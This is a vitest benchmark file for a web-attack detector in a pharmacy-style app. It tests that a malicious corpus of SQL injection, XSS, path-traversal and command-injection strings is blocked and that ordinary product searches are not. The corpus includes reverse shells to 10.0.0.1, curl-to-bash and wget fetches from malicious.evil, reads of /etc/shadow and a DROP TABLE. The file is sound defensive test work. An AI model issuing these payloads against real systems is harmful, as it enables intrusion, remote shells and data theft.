import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import http from 'http';
import { AddressInfo } from 'net';
import { app } from '../src/app.js';
// @ts-ignore
import mirage, { detectSuspiciousActivity } from '../mirage.js';
import { resetFallbackRateLimits } from '../src/middleware/rateLimiter.js';

describe('Stage 4: Enforce-Mode Quality & Precision Benchmark', () => {
  let server: http.Server;
  let baseUrl: string;

  const maliciousCorpus = [
    // SQLi (12)
    "1' UNION SELECT 1,2,3--",
    "UNION ALL SELECT id, password FROM users--",
    "' OR 1=1--",
    "' OR 'a'='a'",
    "admin' OR '1'='1",
    "1; DROP TABLE products--",
    "1; DELETE FROM users--",
    "1' AND 1=1--",
    "'; EXEC xp_cmdshell('dir');--",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(10000000,MD5(1))--",
    "1' AND (SELECT * FROM (SELECT(PG_SLEEP(5)))a)--",

    // XSS (11)
    "<script>alert(1)</script>",
    "<script src='https://attacker.com/malicious.js'></script>",
    "<img src='x' onerror='alert(document.cookie)'>",
    "<svg/onload=alert('XSS')>",
    "<svg><script>alert(1)</script></svg>",
    "javascript:alert('xss')",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('xss')>",
    "<a href='javascript:eval(atob(\"alert(1)\"))'>click</a>",
    "<img src=1 onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",

    // Path Traversal (11)
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "%2e%2e%5c%2e%2e%5cboot.ini",
    "../../etc/hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5cwindows",
    "/var/www/../../etc/passwd",
    "../../.env",
    "../../backup.sql",

    // Command Injection (11)
    "; cat /etc/passwd",
    "; whoami",
    "; id",
    "| ls -la",
    "| cat /etc/shadow",
    "$(whoami)",
    "`whoami`",
    "; nc -e /bin/sh 10.0.0.1 4444",
    "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "; curl https://malicious.evil/shell.sh | bash",
    "; wget https://malicious.evil/backdoor",
  ];

  const legitimateCorpus = [
    "Co-trimoxazole 480",
    "St. John's Wort",
    "vitamin B-12 (500mcg)",
    "Amoxicillin 250mg - Oral Suspension",
    "Children's Cold & Flu Relief",
    "Doctor's Best Magnesium",
    "100% Pure Eucalyptus Oil",
    "Hydrogen Peroxide 3% Topical Solution",
    "Omega-3 Fish Oil (1000mg, 120 softgels)",
    "Bio-Kult Advanced Probiotic - 60 capsules",
    "Epidaurus Sacred Balm (Ancient Formula #4)",
    "Willow Bark Salicin 15% Extract",
    "Neem & Tea Tree Oil Cleanser (250ml)",
    "Aspirin 81mg -- Low Dose",
    "Cough & Cold Nighttime Syrup",
    "Zinc + Vitamin C Chewables (Orange Flavor)",
    "Attic Thyme & Honey Infusion",
    "Asclepeion Consecrated Mineral Water",
    "Glucosamine-Chondroitin Complex (1500mg/1200mg)",
    "Ibuprofen 400mg -- Film-Coated Tablets",
    "B-Complex + B-6 + B-12 Vitamins",
    "Elderberry Syrup -- Concentrated 500ml",
    "Greek Mountain Tea (Sideritis scardica)",
    "Organic Chamomile & Lavender Blend",
    "Melatonin 5mg (Fast-Dissolving)",
    "Menthol 1.5% Topical Analgesic Cream",
    "Hydrocortisone 1% Anti-Itch Ointment",
    "Benzoyl Peroxide 5% Acne Treatment Gel",
    "Cetirizine Hydrochloride 10mg Tablets",
    "Loratadine 10mg (24-Hour Allergy Relief)",
    "Calcium 600mg + Vitamin D3 (400 IU)",
    "Multivitamin & Mineral Formula for Adults",
    "Arnica Montana 30C Pellets",
    "Echinacea Purpurea Herb (400mg)",
    "Valerian Root Extract 500mg",
    "Ginkgo Biloba 120mg (Standardized Extract)",
    "Milk Thistle (Silymarin 80%)",
    "Coenzyme Q10 (CoQ10) 100mg",
    "Ascorbic Acid (Vitamin C Powder, 100% Pure)",
    "Saline Nasal Spray 0.9% USP",
    "Dextromethorphan HBr 15mg / Guaifenesin 200mg",
    "Docusate Sodium 100mg Stool Softener",
    "Bismuth Subsalicylate 262mg Chewable",
    "Diphenhydramine HCl 25mg Caplets",
    "Polyethylene Glycol 3350 Powder for Solution",
  ];

  beforeAll(async () => {
    resetFallbackRateLimits();
    process.env.MIRAGE_MODE = 'enforce';
    process.env.MIRAGE_URL = 'http://127.0.0.1:59999'; // fail-open for local benchmark
    process.env.MIRAGE_API_KEY = 'test_key';

    server = http.createServer(app);
    await new Promise<void>((resolve) => {
      server.listen(0, '127.0.0.1', () => {
        const addr = server.address() as AddressInfo;
        baseUrl = `http://127.0.0.1:${addr.port}`;
        resolve();
      });
    });
  });

  afterAll(async () => {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });

  it('Evaluates malicious corpus: achieves 100% block rate (>=40 attacks)', () => {
    expect(maliciousCorpus.length).toBeGreaterThanOrEqual(40);

    let blockedCount = 0;
    const missed: string[] = [];

    for (const payload of maliciousCorpus) {
      const mockReq: any = {
        method: 'GET',
        url: `/api/products?q=${encodeURIComponent(payload)}`,
        originalUrl: `/api/products?q=${encodeURIComponent(payload)}`,
        path: '/api/products',
        headers: { 'user-agent': 'Mozilla/5.0' },
        body: {},
      };

      const result = detectSuspiciousActivity(mockReq, '/api/products', 'Mozilla/5.0');
      if (result && ['sqli', 'xss', 'traversal', 'cmdi'].includes(result.kind)) {
        blockedCount++;
      } else {
        missed.push(payload);
      }
    }

    const blockRate = (blockedCount / maliciousCorpus.length) * 100;
    console.log(`\n>>> [QUALITY BENCHMARK] Malicious Payload Detection Rate: ${blockRate.toFixed(1)}% (${blockedCount}/${maliciousCorpus.length})`);
    if (missed.length > 0) {
      console.warn('>>> Missed payloads:', missed);
    }

    expect(missed).toEqual([]);
    expect(blockRate).toBe(100);
  });

  it('Evaluates legitimate corpus: achieves 0% false positive rate (>=40 legit queries)', () => {
    expect(legitimateCorpus.length).toBeGreaterThanOrEqual(40);

    let falsePositiveCount = 0;
    const falsePositives: { query: string; reason: any }[] = [];

    for (const query of legitimateCorpus) {
      const mockReq: any = {
        method: 'GET',
        url: `/api/products?q=${encodeURIComponent(query)}`,
        originalUrl: `/api/products?q=${encodeURIComponent(query)}`,
        path: '/api/products',
        headers: { 'user-agent': 'Mozilla/5.0' },
        body: {},
      };

      const result = detectSuspiciousActivity(mockReq, '/api/products', 'Mozilla/5.0');
      if (result) {
        falsePositiveCount++;
        falsePositives.push({ query, reason: result });
      }
    }

    const fpRate = (falsePositiveCount / legitimateCorpus.length) * 100;
    console.log(`>>> [QUALITY BENCHMARK] False-Positive Rate: ${fpRate.toFixed(1)}% (${falsePositiveCount}/${legitimateCorpus.length})\n`);
    if (falsePositives.length > 0) {
      console.warn('>>> False positive matches:', falsePositives);
    }

    expect(falsePositives).toEqual([]);
    expect(fpRate).toBe(0);
  });

  it('End-to-end: Legitimate browse, search, cart, oracle, and login flows are not blocked in enforce mode', async () => {
    resetFallbackRateLimits();
    // 1. Browse catalogue
    const browseRes = await fetch(`${baseUrl}/api/products`);
    expect(browseRes.status).toBe(200);

    // 2. Search with apostrophes and hyphens
    const searchRes = await fetch(`${baseUrl}/api/products?q=${encodeURIComponent("St. John's Wort")}`);
    expect(searchRes.status).toBe(200);

    // 3. Search with parentheses and dosage
    const searchDoseRes = await fetch(`${baseUrl}/api/products?q=${encodeURIComponent("vitamin B-12 (500mcg)")}`);
    expect(searchDoseRes.status).toBe(200);

    // 4. GET /api/auth/nonce
    const nonceRes = await fetch(`${baseUrl}/api/auth/nonce`);
    expect(nonceRes.status).toBe(200);

    // 5. Oracle query
    const oracleRes = await fetch(`${baseUrl}/api/oracle/chat`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
      },
      body: JSON.stringify({ message: "What remedy is blessed for winter cough?" }),
    });
    expect(oracleRes.status).toBe(200);

    // 6. Login flow with dedicated test IP to avoid shared rate limit buckets
    const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'x-forwarded-for': '198.51.100.177',
      },
      body: JSON.stringify({
        email: 'pharmacist@medistore.test',
        password: 'Demo@12345',
      }),
    });
    expect(loginRes.status).toBe(200);
  });
});
